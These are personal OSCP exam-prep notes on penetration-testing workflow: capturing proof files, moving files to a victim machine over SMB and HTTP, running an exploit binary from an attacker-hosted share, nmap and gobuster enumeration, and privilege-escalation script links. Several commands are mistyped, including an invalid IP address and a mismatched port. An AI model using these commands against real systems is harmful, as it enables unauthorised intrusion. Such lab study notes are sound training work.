# OSCP Prep Notes

Welcome to my learning notes for OSCP by OffensiveSecurity. I will update the metrials here during my 30 days course time.

## Taking Proof files

### Windows

```
hostname && whoami && type C:\Documents and Settings\Administrator\Desktop\proof.txt && ipconfig /all
```

### Linux

```
hostname && whoami && cat /root/proof.txt && /sbin/ifconfig
```

## Transferring files

### Rdesktop

If if had a remote dektop machine I used the following command to mount share folder:

```
root@kali:~/#: rdesktop 192.268.11.10 -r disk:share=/home/bayo/store
```

### SMB Share

In kali use Impacket to create local SMB Share:

```
root@kali:~/#: python /usr/share/impacket/examples/smbserver.py MyShare /
```

On victim machine execute my payload via SMB:

```
C:\> \\192.168.11.10\MyShare\exploit_kernerl.exe
```
### Python Server

On my kali machine, start the Python SimpleHTTPServer on port 80:

```
root@kali:~/#: python -m SimpleHTTPServer 8080
```

Then use powershell on victim machine / wget in linux to download my exploit.

## Methodology

1) Ports & Services Enumeration using NMAP

```
root@kali:~/#: nmap -sV -sC -p- <IP>
root@kali:~/#: nmap -sU --top-ports=50 <IP>
root@kali:~/#: nmap --script smb-vuln-* <IP>
root@kali:~/#: nmap -sV -T4 -p- <IP> (Quick method)
```

2) Enumerate web application

```
root@kali:~/#: gobuster dir -u <url> -w /usr/share/wordlist/directory-2.3-meduim.txt
root@kali:~/#: nikito -u <url>
```

3) Post Exploition

After gaining inital acsses to shell and prompt TTY shell, then running one of the following script to enumrate:

Windows:

- Powerup - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- JAWS - https://github.com/411Hall/JAWS

Linux:

- LinEnum.sh - https://github.com/rebootuser/LinEnum
- LSE - https://github.com/diego-treitos/linux-smart-enumeration

If none of them works, move to manully search.

4) Priviliage esclation

Depend on the attack vector preform priviliage esclation.
